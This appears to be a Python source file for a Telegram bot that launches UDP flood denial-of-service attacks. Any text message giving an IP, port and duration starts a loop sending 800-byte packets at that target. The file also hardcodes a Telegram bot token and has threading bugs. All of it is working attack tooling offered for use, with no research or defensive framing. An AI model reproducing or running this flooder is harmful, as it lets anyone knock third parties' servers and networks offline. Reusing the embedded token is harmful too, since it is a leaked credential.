import telegram.ext
import time
import socket
import threading

def start(update, context):
    update.message.reply_text("Hi! Greetings from Irfan")
    
def help(update,context):
    update.message.reply_text("/attack -> Start DDoS \n/help -> Help")

def attack(update, context):
    arr = (update.message.text).split(' ')
    if len(arr) != 3:
        update.message.reply_text("Wrong Format! Please Try Again...... \nFORMAT: {IP} {Port} {Time}")
        return

    host = arr[0]
    port = int(arr[1])
    second = int(arr[2])

    update.message.reply_text(
        f"""
        Attack Initiated

        IP: {host}
        Port: {port}
        Time: {second}
        """
    )

    def send_packet(amplifier):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((host, port))

        t_end = time.time() + second
        while time.time() < t_end:
            s.send(b"\x99" * amplifier)

    threading.Thread(target=send_packet(800), daemon=True).start()
    update.message.reply_text("Attack Completed")


Token = "7150508963:AAGiTQr9F3os6CMv-9rTfRQVJWOJKB-82vo"
updater = telegram.ext.Updater(Token, use_context=True)
disp = updater.dispatcher

disp.add_handler(telegram.ext.CommandHandler('start',start))
disp.add_handler(telegram.ext.CommandHandler('help',help))
disp.add_handler(telegram.ext.MessageHandler(telegram.ext.Filters.text, attack))

print("Bot is Ready to go:")
updater.start_polling()
updater.idle()